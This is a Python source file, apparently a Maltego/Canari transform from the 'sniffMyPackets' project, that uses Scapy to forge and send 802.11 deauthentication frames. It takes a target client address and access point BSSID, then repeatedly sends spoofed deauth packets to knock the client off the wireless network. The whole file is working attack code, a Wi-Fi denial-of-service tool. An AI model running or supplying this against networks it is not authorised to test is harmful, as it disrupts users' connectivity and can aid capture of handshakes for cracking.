#!/usr/bin/env python

import os
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from common.entities import wifuClient
#from canari.maltego.utils import debug, progress
from canari.framework import configure #, superuser

__author__ = 'catalyst256'
__copyright__ = 'Copyright 2013, Sniffmypackets Project'
__credits__ = []

__license__ = 'GPL'
__version__ = '0.1'
__maintainer__ = 'catalyst256'
__email__ = 'catalyst256@gmail.com'
__status__ = 'Development'

__all__ = [
    'dotransform'
]


#@superuser
@configure(
    label='Deauth Packets [U]',
    description='Sends Deauth packets to Access Point',
    uuids=[ 'sniffMyPackets.v2.Deauth2AccessPoint' ],
    inputs=[ ( 'sniffMyPackets', wifuClient ) ],
    debug=True
)
def dotransform(request, response):
  
  client = request.value
  if 'sniffMyPackets.monint' in request.fields:
    interface = request.fields['sniffMyPackets.monint']
  #if 'sniffMyPackets.channel' in request.fields:
    #channel = request.fields['sniffMyPackets.channel']
  if 'sniffMyPackets.clientBSSID' in request.fields:
    bssid = request.fields['sniffMyPackets.clientBSSID']
  count = 64
   
  #os.system("iw dev %s set channel %s" % (interface, channel))
  
  def deAuth(bssid, client, count):
	#pckt = RadioTap()/Dot11(subtype=12, type=0, addr1=bssid, addr2=client, addr3=client) / Dot11Deauth(reason=4)
	#pckt.show()
	while count !=0:
	  try:
		for i in range(64):
		  sendp(RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth())
		count -= 1
	  except KeyboardInterrupt:
		break
	  
  deAuth(bssid, client, count)
  return response
